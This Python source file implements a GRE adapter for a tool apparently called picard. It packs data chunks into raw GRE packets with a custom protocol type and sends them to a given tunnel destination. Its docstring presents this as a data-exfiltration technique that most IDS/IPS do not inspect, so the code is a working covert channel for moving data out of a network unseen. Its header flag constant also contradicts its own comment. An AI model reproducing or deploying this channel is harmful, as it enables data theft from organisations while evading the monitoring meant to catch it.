"""GRE adapter — store chunks in GRE tunnel payloads.

Crafts GRE-encapsulated packets (RFC 2890) with chunk data as payload,
using a custom protocol type and optional GRE key for identification.

Data exfil insight: GRE tunnels are common in enterprise networks for
site-to-site connectivity.  Data hidden in GRE payloads with a custom
protocol type is invisible to most IDS/IPS that don't inspect GRE.

Requires: elevated privileges for raw sockets.
"""

from __future__ import annotations

import socket
import struct
import uuid
from typing import Sequence

from picard.adapters.base import Adapter, AdapterProfile, StoredChunkRef

_GRE_PROTO_PICARD = 0x88B5  # IEEE Local Experimental Ethertype
_IPPROTO_GRE = 47  # GRE protocol number (not in socket module on Windows)


class GreAdapter(Adapter):
    """Scatter chunks into GRE tunnel payloads."""

    def __init__(
        self,
        tunnel_src: str,
        tunnel_dst: str,
        *,
        gre_key: int = 0x91CA4D,
        max_chunk_bytes: int = 8950,
    ) -> None:
        self._tunnel_src = tunnel_src
        self._tunnel_dst = tunnel_dst
        self._gre_key = gre_key
        self._max = max_chunk_bytes
        self._cache: dict[str, str] = {}  # key -> encoded_chunk
        self._loc_to_key: dict[str, str] = {}  # location -> key
        self._seq = 0

    def profile(self) -> AdapterProfile:
        return AdapterProfile(
            name="gre",
            max_chunk_bytes=self._max,
            persistent=False,
            ordered=True,
            rate_limit_per_min=1000,
        )

    def _make_gre_header(self, seq: int) -> bytes:
        # Flags: Key present (bit 2) + Sequence present (bit 3)
        flags_version = 0x2020
        return struct.pack(
            "!HHI I",
            flags_version,
            _GRE_PROTO_PICARD,
            self._gre_key,
            seq,
        )

    def _chunk_key(self, encoded_chunk: str) -> str:
        from picard.chunker import Chunk
        try:
            chunk = Chunk.decode(encoded_chunk)
            return f"{chunk.manifest_id}_{chunk.block_index}_{chunk.chunk_index}"
        except (ValueError, Exception):
            return uuid.uuid4().hex

    async def write_chunk(self, encoded_chunk: str) -> StoredChunkRef:
        import asyncio

        key = self._chunk_key(encoded_chunk)
        self._seq += 1
        seq = self._seq
        gre_hdr = self._make_gre_header(seq)
        key_bytes = key.encode().ljust(32, b"\x00")[:32]
        packet = gre_hdr + key_bytes + encoded_chunk.encode()

        def _send():
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, _IPPROTO_GRE)
            try:
                sock.sendto(packet, (self._tunnel_dst, 0))
            finally:
                sock.close()

        await asyncio.to_thread(_send)
        loc = f"gre://{self._tunnel_dst}/{self._gre_key:#x}/{seq}"
        self._cache[key] = encoded_chunk
        self._loc_to_key[loc] = key
        return StoredChunkRef(adapter_name="gre", location=loc)

    async def read_chunk(self, ref: StoredChunkRef) -> str:
        key = self._loc_to_key.get(ref.location)
        if key and key in self._cache:
            return self._cache[key]
        raise KeyError(f"chunk not in cache: {ref.location}")

    async def delete_chunk(self, ref: StoredChunkRef) -> bool:
        key = self._loc_to_key.pop(ref.location, None)
        if key:
            self._cache.pop(key, None)
            return True
        return False

    async def list_chunks(self, manifest_id: str) -> Sequence[StoredChunkRef]:
        return [
            StoredChunkRef(
                adapter_name="gre",
                location=f"gre://{self._tunnel_dst}/{self._gre_key:#x}/{k}",
            )
            for k in self._cache
            if k.startswith(manifest_id)
        ]

    async def health_check(self) -> bool:
        import asyncio

        def _check():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, _IPPROTO_GRE)
                sock.close()
                return True
            except OSError:
                return False

        return await asyncio.to_thread(_check)

    async def capacity(self) -> dict[str, int | None]:
        used = sum(len(v.encode()) for v in self._cache.values())
        return {
            "used_bytes": used,
            "free_bytes": None,
            "total_bytes": None,
            "chunk_count": len(self._cache),
        }
